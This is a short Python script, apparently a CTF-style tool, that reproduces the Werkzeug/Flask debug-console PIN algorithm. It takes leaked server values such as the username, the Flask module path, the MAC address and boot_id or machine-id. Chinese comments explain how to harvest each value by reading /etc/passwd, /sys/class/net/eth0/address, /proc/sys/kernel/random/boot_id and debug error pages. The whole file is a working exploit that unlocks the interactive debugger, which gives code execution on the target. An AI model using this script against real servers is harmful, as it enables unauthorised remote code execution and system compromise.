import hashlib

md5_list = [ 
    'root', #当前用户，可通过读取/etc/passwd获取 
    'flask.app', #一般情况为固定值 
    'Flask', #一般情况为固定值 
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc', #可通过debug错误页面获取    
    '2485377892354', #mac地址的十进制，通过读取/sys/class/net/eth0/address获取mac地址 如果不是映射端口 可以通过arp ip命令获取 
    '0c5b39a3-bba2-472c-a43d-8e013b2874e8' #机器名，通过读取/proc/sys/kernel/random/boot_id 或/etc/machine-id获取 
]
def get_pin(md5_list): 
    h = hashlib.md5() 
    for bit in md5_list: 
        if not bit: 
            continue 
        if isinstance(bit, str): 
            bit = bit.encode('utf-8') 
        h.update(bit)
        
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size))
                break
        else:
            rv = num
    print(rv)
    
get_pin(md5_list)



